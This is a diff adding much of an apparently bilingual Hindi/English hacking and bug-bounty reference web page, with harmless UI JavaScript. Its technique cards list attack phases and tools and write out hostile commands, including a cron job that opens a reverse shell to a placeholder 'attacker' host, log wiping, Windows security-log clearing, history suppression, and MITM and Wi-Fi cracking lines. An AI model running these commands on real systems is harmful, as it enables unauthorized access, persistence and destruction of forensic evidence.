+                            • Metasploit Framework: exploit/multi/handler<br>
+                            • Custom exploit writing with Python<br>
+                            • Buffer overflow exploitation<br>
+                            • Return Oriented Programming (ROP)<br><br>
+                            
+                            <strong>🔸 Social Engineering:</strong><br>
+                            • SET (Social Engineer Toolkit)<br>
+                            • Phishing campaigns with GoPhish<br>
+                            • Spear phishing attacks<br>
+                            • USB drop attacks with Rubber Ducky
+                        </div>
+                    </div>
+
+                    <div class="technique-item">
+                        <div class="technique-name">Phase 4: 🚀 Post-Exploitation & Persistence</div>
+                        <div class="technique-desc">
+                            <strong>🔸 Privilege Escalation:</strong><br>
+                            • Linux: LinPEAS, LinEnum, linux-exploit-suggester<br>
+                            • Windows: WinPEAS, PowerUp, Sherlock<br>
+                            • Kernel exploits: searchsploit kernel version<br>
+                            • SUID/GUID binaries: find / -perm -u=s -type f 2>/dev/null<br><br>
+                            
+                            <strong>🔸 Persistence Mechanisms:</strong><br>
+                            • Backdoors: netcat listeners, web shells<br>
+                            • Registry modifications (Windows)<br>
+                            • Cron jobs (Linux): echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" | crontab<br>
+                            • Service creation and modification<br><br>
+                            
+                            <strong>🔸 Lateral Movement:</strong><br>
+                            • Pass-the-Hash attacks<br>
+                            • Kerberoasting: GetUserSPNs.py<br>
+                            • Golden/Silver ticket attacks<br>
+                            • RDP/SSH lateral movement
+                        </div>
+                    </div>
+
+                    <div class="technique-item">
+                        <div class="technique-name">Phase 5: 💎 Data Exfiltration & Coverage</div>
+                        <div class="technique-desc">
+                            <strong>🔸 Data Harvesting:</strong><br>
+                            • Database dumps: mysqldump, pg_dump<br>
+                            • File system search: find / -name "*.txt" -o -name "*.pdf"<br>
+                            • Memory dumps: volatility framework<br>
+                            • Browser credential extraction<br><br>
+                            
+                            <strong>🔸 Stealthy Exfiltration:</strong><br>
+                            • DNS tunneling: iodine, dnscat2<br>
+                            • ICMP tunneling: ptunnel<br>
+                            • Steganography: steghide, outguess<br>
+                            • Encrypted channels: SSH tunnels, TOR<br><br>
+                            
+                            <strong>🔸 Anti-Forensics:</strong><br>
+                            • Log deletion: rm /var/log/* (Linux)<br>
+                            • Event log clearing (Windows): wevtutil cl Security<br>
+                            • Timestamp manipulation: touch -t command<br>
+                            • Secure deletion: shred, sdelete<br><br>
+                            
+                            <strong>🔸 Advanced Covering Tracks:</strong><br>
+                            • History manipulation: unset HISTFILE<br>
+                            • Process hiding: rootkits, process injection<br>
+                            • Network traffic obfuscation<br>
+                            • Removing artifacts and IoCs
+                        </div>
+                    </div>
+                </div>
+
+                <div class="category-card">
+                    <h2 class="category-title">🔐 Network & System Penetration</h2>
+                    <div class="step-content">
+                        <div class="technique-item">
+                            <div class="technique-name">🌐 Advanced Network Attacks</div>
+                            <div class="technique-desc">
+                                <strong>🔸 Man-in-the-Middle (MITM):</strong><br>
+                                • Ettercap: ettercap -T -M arp:remote /target1// /gateway//<br>
+                                • Bettercap: bettercap -iface wlan0 -T target_ip<br>
+                                • MITMf: mitmf --arp --spoof --gateway gateway_ip --target target_ip<br>
+                                • SSL Kill Switch: sslstrip, ssl2strip<br><br>
+                                
+                                <strong>🔸 Wireless Network Attacks:</strong><br>
+                                • WPA/WPA2 Cracking: aircrack-ng -w wordlist.txt capture.cap<br>
+                                • WPS Attacks: reaver -i wlan0mon -b target_bssid -vv<br>
+                                • Evil Twin: hostapd-wpe configuration<br>
+                                • KRACK Attack: WPA2 protocol vulnerability<br>
+                                • Bluetooth: btscanner, bluez-tools, spooftooph
+                            </div>
+                        </div>
+                        <div class="technique-item">
+                            <div class="technique-name">💻 System Exploitation Advanced</div>
+                            <div class="technique-desc">
+                                <strong>🔸 Buffer Overflow Exploitation:</strong><br>
+                                • Stack overflow: pattern creation, EIP control<br>
+                                • Heap overflow: heap spraying, use-after-free<br>
+                                • Return-to-libc: bypassing NX bit<br>
+                                • ROP chains: Return Oriented Programming<br>
+                                • ASLR bypass: information disclosure<br><br>
+                                
+                                <strong>🔸 Advanced Privilege Escalation:</strong><br>
+                                • DLL hijacking: placing malicious DLLs<br>
+                                • Service binary path manipulation<br>
+                                • Token impersonation: incognito, potato attacks<br>
+                                • UAC bypass: fodhelper, eventvwr<br>
+                                • Kernel exploits: MS17-010, Dirty COW
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tools Section -->
+            <section id="tools" class="section">
+                <div class="category-card">
+                    <h2 class="category-title">🛠️ Essential Penetration Testing Tools</h2>
+                    <div class="step-content">
+                        <div class="tool-item">
+                            <div class="tool-name">🐧 Kali Linux Arsenal</div>
+                            <div class="tool-desc">
+                                <strong>Network Analysis:</strong> Wireshark, TCPdump, Netcat<br>
+                                <strong>Web Testing:</strong> Burp Suite, OWASP ZAP, Nikto<br>
+                                <strong>Exploitation:</strong> Metasploit, ExploitDB, SearchSploit<br>
+                                <strong>Post-Exploitation:</strong> Empire, Cobalt Strike, PowerSploit
+                            </div>
+                        </div>
+                        <div class="tool-item">
+                            <div class="tool-name">🔍 Reconnaissance Suite</div>
+                            <div class="tool-desc">
+                                <strong>OSINT:</strong> theHarvester, Maltego, Recon-ng<br>
+                                <strong>Subdomain Enum:</strong> Amass, Subfinder, Assetfinder<br>
+                                <strong>Port Scanning:</strong> Nmap, Masscan, RustScan<br>
+                                <strong>DNS Tools:</strong> dnsrecon, fierce, DNSenum
+                            </div>
+                        </div>
+                        <div class="tool-item">
+                            <div class="tool-name">💉 Injection Testing</div>
+                            <div class="tool-desc">
+                                <strong>SQL Injection:</strong> SQLmap, jSQL, NoSQLMap<br>
+                                <strong>Command Injection:</strong> Commix<br>
+                                <strong>LDAP Injection:</strong> LDAPSearch<br>
+                                <strong>XPath Injection:</strong> Custom scripts
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="category-card">
+                    <h2 class="category-title">📱 Mobile & IoT Security</h2>
+                    <div class="step-content">
+                        <div class="tool-item">
+                            <div class="tool-name">📱 Mobile Testing Tools</div>
+                            <div class="tool-desc">
+                                <strong>Android:</strong> Drozer, MobSF, APKTool<br>
+                                <strong>iOS:</strong> Hopper, class-dump, Frida<br>
+                                <strong>Dynamic Analysis:</strong> Frida, Xposed Framework<br>
+                                <strong>Static Analysis:</strong> QARK, Bandit
+                            </div>
+                        </div>
+                        <div class="tool-item">
+                            <div class="tool-name">🌐 IoT Security Testing</div>
+                            <div class="tool-desc">
+                                <strong>Firmware Analysis:</strong> Binwalk, Firmwalker<br>
+                                <strong>Protocol Testing:</strong> Wireshark, Scapy<br>
+                                <strong>Hardware Testing:</strong> Logic analyzers, UART<br>
+                                <strong>Radio Frequency:</strong> RTL-SDR, HackRF
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="category-card">
+                    <h2 class="category-title">☁️ Cloud & Container Security</h2>
+                    <div class="step-content">
+                        <div class="tool-item">
+                            <div class="tool-name">☁️ Cloud Security Tools</div>
+                            <div class="tool-desc">
+                                <strong>AWS:</strong> Scout Suite, Prowler, CloudMapper<br>
+                                <strong>Azure:</strong> MicroBurst, ROADtools<br>
+                                <strong>GCP:</strong> Scout Suite, GCP Scanner<br>
+                                <strong>Multi-Cloud:</strong> CloudSploit, Checkov
+                            </div>
+                        </div>
+                        <div class="tool-item">
+                            <div class="tool-name">🐳 Container Security</div>
+                            <div class="tool-desc">
+                                <strong>Docker:</strong> Docker Bench, Clair, Trivy<br>
+                                <strong>Kubernetes:</strong> Kube-hunter, Kube-bench<br>
+                                <strong>Container Escape:</strong> Docker breakouts<br>
+                                <strong>Registry Scanning:</strong> Harbor, Quay
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Questions Section -->
+            <section id="questions" class="section">
+                <div class="question-section">
+                    <h2 class="category-title">❓ Ask Your Security Questions</h2>
+                    <form class="question-form" id="questionForm">
+                        <input type="text" class="question-input" placeholder="आपका नाम / Your Name" required>
+                        <input type="email" class="question-input" placeholder="आपका ईमेल / Your Email" required>
+                        <select class="question-input" required>
+                            <option value="">प्रश्न की श्रेणी चुनें / Select Question Category</option>
+                            <option value="bug-bounty">Bug Bounty</option>
+                            <option value="web-security">Web Application Security</option>
+                            <option value="network-security">Network Security</option>
+                            <option value="mobile-security">Mobile Security</option>
+                            <option value="tools">Tools & Techniques</option>
+                            <option value="career">Career Guidance</option>
+                            <option value="other">Other</option>
+                        </select>
+                        <textarea class="question-textarea" rows="5" placeholder="अपना प्रश्न यहाँ लिखें... / Write your question here..." required></textarea>
+                        <button type="submit" class="submit-btn">प्रश्न भेजें / Submit Question</button>
+                    </form>
+                </div>
+
+                <div class="category-card">
+                    <h2 class="category-title">🔥 Frequently Asked Questions</h2>
+                    <div class="step-content">
+                        <div class="technique-item">
+                            <div class="technique-name">Q: Bug bounty कैसे शुरू करें?</div>
+                            <div class="technique-desc">
+                                <strong>Answer:</strong> पहले web security basics सीखें, फिर OWASP Top 10 को समझें। HackerOne, Bugcrowd पर account बनाएं और small programs से शुरुआत करें।
+                            </div>
+                        </div>
+                        <div class="technique-item">
+                            <div class="technique-name">Q: कौन से tools सबसे जरूरी हैं?</div>
+                            <div class="technique-desc">
+                                <strong>Answer:</strong> Burp Suite, Nmap, SQLmap, Sublist3r, और Amass। साथ ही Kali Linux या Parrot OS install करें।
+                            </div>
+                        </div>
+                        <div class="technique-item">
+                            <div class="technique-name">Q: Legal issues से कैसे बचें?</div>
+                            <div class="technique-desc">
+                                <strong>Answer:</strong> हमेशा permission लेकर ही testing करें। Bug bounty programs के scope को follow करें और unauthorized testing न करें।
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </main>
+
+    <script>
+        function showSection(sectionId) {
+            // Hide all sections
+            const sections = document.querySelectorAll('.section');
+            sections.forEach(section => {
+                section.classList.remove('active');
+            });
+
+            // Remove active class from all buttons
+            const buttons = document.querySelectorAll('.nav-btn');
+            buttons.forEach(button => {
+                button.classList.remove('active');
+            });
+
+            // Show selected section
+            document.getElementById(sectionId).classList.add('active');
+            
+            // Add active class to clicked button
+            event.target.classList.add('active');
+        }
+
+        // Handle form submission
+        document.getElementById('questionForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData);
+            
+            // Here you would typically send the data to a server
+            alert('आपका प्रश्न सफलतापूर्वक भेज दिया गया है! / Your question has been submitted successfully!\n\nहम जल्द ही आपको जवाब देंगे। / We will respond to you soon.');
+            
+            // Reset form
+            this.reset();
+        });
+
+        // Add smooth scrolling for better UX
+        document.addEventListener('DOMContentLoaded', function() {
+            // Add some interactive effects
+            const cards = document.querySelectorAll('.phase-card, .category-card');
+            
+            cards.forEach(card => {
+                card.addEventListener('mouseenter', function() {
+                    this.style.transform = 'translateY(-8px) scale(1.02)';
+                });
+                
+                card.addEventListener('mouseleave', function() {
+                    this.style.transform = 'translateY(0) scale(1)';
+                });
+            });
+
+            // Add typing effect to header
+            const headerText = document.querySelector('.header h1');
+            const originalText = headerText.textContent;
+            headerText.textContent = '';
+            
+            let i = 0;
+            function typeWriter() {
+                if (i < originalText.length) {
+                    headerText.textContent += originalText.charAt(i);
+                    i++;
+                    setTimeout(typeWriter, 100);
+                }
+            }
+            
+            setTimeout(typeWriter, 500);
+
+            // Add search functionality
+            const searchInput = document.createElement('input');
+            searchInput.type = 'text';
+            searchInput.placeholder = 'Search tools, techniques, or information...';
+            searchInput.className = 'search-input';
+            searchInput.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                padding: 10px;
+                border: 2px solid #ff0000;
+                border-radius: 25px;
+                background: rgba(0,0,0,0.8);
+                color: white;
+                width: 300px;
+                z-index: 1000;
+                backdrop-filter: blur(10px);
+            `;
+            
+            document.body.appendChild(searchInput);
+
+            searchInput.addEventListener('input', function() {
+                const searchTerm = this.value.toLowerCase();
+                const allContent = document.querySelectorAll('.tool-item, .technique-item');
+                
+                allContent.forEach(item => {
+                    const text = item.textContent.toLowerCase();
+                    if (text.includes(searchTerm) || searchTerm === '') {
+                        item.style.display = 'block';
+                        item.style.backgroundColor = searchTerm && text.includes(searchTerm) ? 
+                            'rgba(255, 0, 0, 0.2)' : 'rgba(0, 0, 0, 0.4)';
+                    } else {
+                        item.style.display = 'none';
+                    }
+                });
+            });
+
+            // Add progress indicator
+            const progressBar = document.createElement('div');
+            progressBar.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                height: 4px;
+                background: linear-gradient(90deg, #ff0000, #00ff00);
+                z-index: 1000;
+                transition: width 0.3s ease;
+            `;
+            document.body.appendChild(progressBar);
+
+            window.addEventListener('scroll', function() {
+                const scrolled = (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100;
+                progressBar.style.width = scrolled + '%';
+            });
+
+            // Add copy to clipboard functionality for commands
+            const codeElements = document.querySelectorAll('.tool-desc, .technique-desc');
+            codeElements.forEach(element => {
+                element.addEventListener('click', function(e) {
+                    const text = e.target.textContent;
+                    const codeMatch = text.match(/([•]\s*[^•\n]+)/g);
+                    
+                    if (codeMatch && e.target.tagName !== 'STRONG') {
+                        const commands = codeMatch.join('\n');
+                        navigator.clipboard.writeText(commands).then(() => {
+                            // Show toast notification
+                            const toast = document.createElement('div');
+                            toast.textContent = 'Commands copied to clipboard!';
+                            toast.style.cssText = `
+                                position: fixed;
+                                top: 100px;
+                                right: 20px;
+                                background: #00ff00;
+                                color: black;
+                                padding: 10px 20px;
+                                border-radius: 5px;
+                                z-index: 1000;
+                                font-weight: bold;
+                            `;
+                            document.body.appendChild(toast);
+                            
+                            setTimeout(() => {
+                                document.body.removeChild(toast);
+                            }, 2000);
+                        });
+                    }
+                });
+            });
+
+            // Add floating action button for quick access
+            const fab = document.createElement('div');
+            fab.innerHTML = '🚀';
+            fab.style.cssText = `
+                position: fixed;
+                bottom: 30px;
+                right: 30px;
+                width: 60px;
+                height: 60px;
+                background: linear-gradient(135deg, #ff0000, #cc0000);
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 24px;
+                cursor: pointer;
+                z-index: 1000;
+                box-shadow: 0 4px 20px rgba(255, 0, 0, 0.4);
+                transition: all 0.3s ease;
+            `;
+
+            fab.addEventListener('click', function() {
+                window.scrollTo({
+                    top: 0,
+                    behavior: 'smooth'
+                });
+            });
+
+            fab.addEventListener('mouseenter', function() {
+                this.style.transform = 'scale(1.1) rotate(360deg)';
+            });
+
+            fab.addEventListener('mouseleave', function() {
+                this.style.transform = 'scale(1) rotate(0deg)';
+            });
+
+            document.body.appendChild(fab);
+
+            // Add dark mode toggle
+            const darkModeToggle = document.createElement('button');
+            darkModeToggle.innerHTML = '🌙';
+            darkModeToggle.style.cssText = `
+                position: fixed;
+                top: 20px;
+                left: 20px;
+                width: 50px;
+                height: 50px;
+                border: none;
+                border-radius: 50%;
+                background: rgba(255, 255, 255, 0.2);
+                color: white;
+                font-size: 20px;
+                cursor: pointer;
+                z-index: 1000;
+                backdrop-filter: blur(10px);
+                transition: all 0.3s ease;
+            `;
+
+            darkModeToggle.addEventListener('click', function() {
+                document.body.classList.toggle('light-mode');
+                this.innerHTML = document.body.classList.contains('light-mode') ? '☀️' : '🌙';
+            });
+
+            document.body.appendChild(darkModeToggle);
+
+            // Add light mode styles
+            const lightModeStyles = document.createElement('style');
+            lightModeStyles.innerHTML = `
+                .light-mode {
+                    background: linear-gradient(135deg, #f0f0f0 0%, #e0e0e0 50%, #d0d0d0 100%) !important;
+                    color: #333333 !important;
+                }
+                .light-mode .header {
+                    background: linear-gradient(135deg, #007acc 0%, #005299 100%) !important;
+                }
+                .light-mode .nav {
+                    background: rgba(255, 255, 255, 0.9) !important;
+                    border-bottom: 2px solid #007acc !important;
+                }
+                .light-mode .nav-btn {
+                    background: linear-gradient(135deg, #007acc, #005299) !important;
+                }
+                .light-mode .phase-card, .light-mode .category-card {
+                    background: rgba(255, 255, 255, 0.8) !important;
+                    border: 1px solid rgba(0, 122, 204, 0.3) !important;
+                    color: #333333 !important;
+                }
+                .light-mode .tool-item, .light-mode .technique-item {
+                    background: rgba(240, 240, 240, 0.8) !important;
+                    border-left: 4px solid #007acc !important;
+                    color: #333333 !important;
+                }
+                .light-mode .phase-title, .light-mode .category-title {
+                    color: #007acc !important;
+                }
+                .light-mode .tool-name, .light-mode .technique-name {
+                    color: #0066cc !important;
+                }
+            `;
+            document.head.appendChild(lightModeStyles);
+        });
+
+        // Add keyboard shortcuts
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey) {
+                switch(e.key) {
+                    case '1':
+                        e.preventDefault();
+                        showSection('bug-bounty');
+                        document.querySelector('[onclick="showSection(\'bug-bounty\')"]').classList.add('active');
+                        break;
+                    case '2':
+                        e.preventDefault();
+                        showSection('hacking-techniques');
+                        document.querySelector('[onclick="showSection(\'hacking-techniques\')"]').classList.add('active');
+                        break;
+                    case '3':
+                        e.preventDefault();
+                        showSection('tools');
+                        document.querySelector('[onclick="showSection(\'tools\')"]').classList.add('active');
+                        break;
+                    case '4':
+                        e.preventDefault();
+                        showSection('questions');
+                        document.querySelector('[onclick="showSection(\'questions\')"]').classList.add('active');
+                        break;
+                }
+            }
+        });
+
+        // Add loading animation
+        window.addEventListener('load', function() {
+            const loader = document.createElement('div');
+            loader.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: #0a0a0a;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 9999;
+                flex-direction: column;
+            `;
+            
+            loader.innerHTML = `
+                <div style="border: 4px solid rgba(255,0,0,0.3); border-top: 4px solid #ff0000; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px;"></div>
+                <div style="color: white; font-size: 18px;">Loading Hacking Arsenal...</div>
+            `;
+
+            const spinStyles = document.createElement('style');
+            spinStyles.innerHTML = `
+                @keyframes spin {
+                    0% { transform: rotate(0deg); }
+                    100% { transform: rotate(360deg); }
+                }
+            `;
+            document.head.appendChild(spinStyles);
+            
+            document.body.appendChild(loader);
+            
+            setTimeout(() => {
+                loader.style.opacity = '0';
+                setTimeout(() => {
+                    document.body.removeChild(loader);
+                }, 500);
+            }, 2000);
+        });
+    </script>
 </body>
-	</html>
+</html>
